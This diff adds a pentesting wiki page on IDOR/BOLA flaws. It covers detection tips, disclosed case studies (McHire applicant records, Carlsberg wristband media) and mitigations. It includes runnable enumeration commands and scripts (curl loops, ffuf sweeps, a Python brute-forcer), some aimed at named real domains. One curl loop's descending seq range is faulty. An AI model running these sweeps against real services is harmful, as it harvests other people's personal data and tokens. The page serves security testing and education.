@@ -1,0 +1,178 @@
+# IDOR (Insecure Direct Object Reference)
+
+{{#include ../banners/hacktricks-training.md}}
+
+IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) appears when a web or API endpoint discloses or accepts a user–controllable identifier that is used **directly** to access an internal object **without verifying that the caller is authorized** to access/modify that object.  
+Successful exploitation normally allows horizontal or vertical privilege-escalation such as reading or modifying other users’ data and, in the worst case, full account takeover or mass-data exfiltration.
+
+---
+## 1. Identifying Potential IDORs
+
+1. Look for **parameters that reference an object**:
+   * Path: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`  
+   * Query: `?id=42`, `?invoice=2024-00001`  
+   * Body / JSON: `{"user_id": 321, "order_id": 987}`  
+   * Headers / Cookies: `X-Client-ID: 4711`
+2. Prefer endpoints that **read or update** data (`GET`, `PUT`, `PATCH`, `DELETE`).
+3. Note when identifiers are **sequential or predictable** – if your ID is `64185742`, then `64185741` probably exists.
+4. Explore hidden or alternate flows (e.g. *"Paradox team members"* link in login pages) that might expose extra APIs.
+5. Use an **authenticated low-privilege session** and change only the ID **keeping the same token/cookie**. The absence of an authorization error is usually a sign of IDOR.<sup>[[3]](#references)</sup>
+
+### Quick manual tampering (Burp Repeater)
+```
+PUT /api/lead/cem-xhr HTTP/1.1
+Host: www.example.com
+Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/json
+
+{"lead_id":64185741}
+```
+
+### Automated enumeration (Burp Intruder / curl loop)
+```bash
+for id in $(seq 64185742 64185700); do
+  curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
+       -H 'Content-Type: application/json' \
+       -H "Cookie: auth=$TOKEN" \
+       -d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
+done
+```
+
+### Enumerating predictable download IDs (ffuf)
+Authenticated file-hosting panels often store per-user metadata in a single `files` table and expose a download endpoint such as `/download.php?id=<int>`. If the handler only checks whether the ID exists (and not whether it belongs to the authenticated user), you can sweep the integer space with your valid session cookie and steal other tenants' backups/configs:<sup>[[5]](#references)</sup>
+
+```bash
+ffuf -u http://file.era.htb/download.php?id=FUZZ \
+  -H "Cookie: PHPSESSID=<session>" \
+  -w <(seq 0 6000) \
+  -fr 'File Not Found' \
+  -o hits.json
+jq -r '.results[].url' hits.json    # fetch surviving IDs such as company backups or signing keys
+```
+
+* `-fr` removes 404-style templates so only true hits remain (e.g., IDs 54/150 leaking full site backups and signing material).
+* The same FFUF workflow works with Burp Intruder or a curl loop—just ensure you stay authenticated while incrementing IDs.
+
+---
+
+### Authenticated combinatorial enumeration (ffuf + jq)
+
+Some IDORs accept **multiple object IDs** (e.g., chat threads between two users). If the app only checks that you're logged in, you can fuzz both IDs while keeping your session cookie:<sup>[[6]](#references)</sup>
+
+```bash
+ffuf -u 'http://target/chat.php?chat_users[0]=NUM1&chat_users[1]=NUM2' \
+  -w <(seq 1 62):NUM1 -w <(seq 1 62):NUM2 \
+  -H 'Cookie: PHPSESSID=<session>' \
+  -ac -o chats.json -of json
+```
+
+Then, post-process the JSON output with `jq` to remove symmetric duplicates (A,B) vs (B,A) and keep only unique pairs:
+
+```bash
+jq -r '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | .url' chats.json
+```
+
+---
+
+### Error-response oracle for user/file enumeration
+
+When a download endpoint accepts both a username and a filename (e.g. `/view.php?username=<u>&file=<f>`), subtle differences in error messages often create an oracle:<sup>[[4]](#references)</sup>
+
+- Non-existent username → "User not found"
+- Bad filename but valid extension → "File does not exist" (sometimes also lists available files)
+- Bad extension → validation error
+
+With any authenticated session, you can fuzz the username parameter while holding a benign filename and filter on the "user not found" string to discover valid users:
+
+```bash
+ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
+  -b 'PHPSESSID=<session-cookie>' \
+  -w /opt/SecLists/Usernames/Names/names.txt \
+  -fr 'User not found'
+```
+
+Once valid usernames are identified, request specific files directly (e.g., `/view.php?username=amanda&file=privacy.odt`). This pattern commonly leads to unauthorized disclosure of other users’ documents and credential leakage.
+
+---
+## 2. Real-World Case Study – McHire Chatbot Platform (2025)
+
+During an assessment of the Paradox.ai-powered **McHire** recruitment portal the following IDOR was discovered:
+
+* Endpoint: `PUT /api/lead/cem-xhr`
+* Authorization: user session cookie for **any** restaurant test account
+* Body parameter: `{"lead_id": N}` – 8-digit, **sequential** numeric identifier
+
+By decreasing `lead_id` the tester retrieved arbitrary applicants’ **full PII** (name, e-mail, phone, address, shift preferences) plus a consumer **JWT** that allowed session hijacking. Enumeration of the range `1 – 64,185,742` exposed roughly **64 million** records.<sup>[[1]](#references)</sup>
+
+Proof-of-Concept request:
+```bash
+curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
+     -H 'Content-Type: application/json' \
+     -d '{"lead_id":64185741}'
+```
+
+Combined with **default admin credentials** (`123456:123456`) that granted access to the test account, the vulnerability resulted in a critical, company-wide data breach.<sup>[[1]](#references)</sup>
+
+### Case Study – Wristband QR codes as weak bearer tokens (2025–2026)
+
+*Flow:* Exhibition visitors received QR-coded wristbands; scanning `https://homeofcarlsberg.com/memories/` let the browser take the **printed wristband ID**, hex-encode it, and call a `cloudfunctions.net` backend to fetch stored media (photos/videos + names). There was **no session binding** or user authentication—**knowledge of the ID = authorization**.<sup>[[7]](#references)</sup>
+
+*Predictability:* Wristband IDs followed a short pattern such as `C-285-100` → ASCII hex `432d3238352d313030` (`43 2d 32 38 35 2d 31 30 30`). The space was estimated at ~26M combinations, trivial to exhaust online.
+
+*Exploitation workflow with Burp Intruder:*
+1. **Payload generation:** Build candidate IDs (e.g., `[A-Z]-###-###`). Use a Burp Intruder **Pitchfork** or **Cluster Bomb** attack with positions for the letter and digits. Add a **payload processing rule → Add prefix/suffix → payload encoding: ASCII hex** so each request transmits the hex string expected by the backend.
+2. **Response grep:** Mark Intruder **grep-match** for markers present only in valid responses (e.g., media URLs/JSON fields). Invalid IDs typically returned an empty array/404.
+3. **Throughput measurement:** ~1,000,000 IDs were tested in ~2 hours from a laptop (~139 req/s). At that rate the full keyspace (~26M) would fall in ~52 hours. The sample run already exposed ~500 valid wristbands (videos + full names).
+4. **Rate-limiting verification:** After the vendor claimed throttling, rerun the same Intruder config. Identical throughput/hit-rate proved the control was absent/ineffective; enumeration continued unhindered.
+
+Quick scriptable variant (client-side hex encoding):
+```python
+import requests
+
+def to_hex(s):
+    return ''.join(f"{ord(c):02x}" for c in s)
+
+for band_id in ["C-285-100", "T-544-492"]:
+    hex_id = to_hex(band_id)
+    r = requests.get("https://homeofcarlsberg.com/memories/api", params={"id": hex_id})
+    if r.ok and "media" in r.text:
+        print(band_id, "->", r.json())
+```
+
+> **Lesson:** Encoding (ASCII→hex/Base64) does **not** add entropy; short IDs become **bearer tokens** that are enumerable despite cosmetic encoding. Without per-user authorization + high-entropy secrets, media/PII can be bulk-harvested even if “rate limiting” is claimed.
+
+---
+## 3. Impact of IDOR / BOLA
+* Horizontal escalation – read/update/delete **other users’** data.
+* Vertical escalation – low privileged user gains admin-only functionality.
+* Mass-data breach if identifiers are sequential (e.g., applicant IDs, invoices).
+* Account takeover by stealing tokens or resetting passwords of other users.<sup>[[2]](#references)</sup>
+
+---
+## 4. Mitigations & Best Practices
+1. **Enforce object-level authorization** on every request (`user_id == session.user`).  
+2. Prefer **indirect, unguessable identifiers** (UUIDv4, ULID) instead of auto-increment IDs.
+3. Perform authorization **server-side**, never rely on hidden form fields or UI controls.
+4. Implement **RBAC / ABAC** checks in a central middleware.
+5. Add **rate-limiting & logging** to detect enumeration of IDs.
+6. Security test every new endpoint (unit, integration, and DAST).<sup>[[2]](#references)</sup>
+
+---
+## 5. Tooling
+* **BurpSuite extensions**: Authorize, Auto Repeater, Turbo Intruder.  
+* **OWASP ZAP**: Auth Matrix, Forced Browse.  
+* **Github projects**: `bwapp-idor-scanner`, `Blindy` (bulk IDOR hunting).
+
+
+
+## References
+
+- [1] [McHire Chatbot Platform: Default Credentials and IDOR Expose 64M Applicants’ PII](https://ian.sh/mcdonalds)
+- [2] [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
+- [3] [How to Find More IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
+- [4] [HTB Nocturnal: IDOR oracle → file theft](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
+- [5] [0xdf – HTB Era: predictable download IDs → backups and signing keys](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
+- [6] [0xdf – HTB: Guardian](https://0xdf.gitlab.io/2026/02/28/htb-guardian.html)
+- [7] [Carlsberg memories wristband IDOR – predictable QR IDs + Intruder brute force (2026)](https://www.pentestpartners.com/security-blog/carlsberg-probably-not-the-best-cybersecurity-in-the-world/)
+
+{{#include ../banners/hacktricks-training.md}}
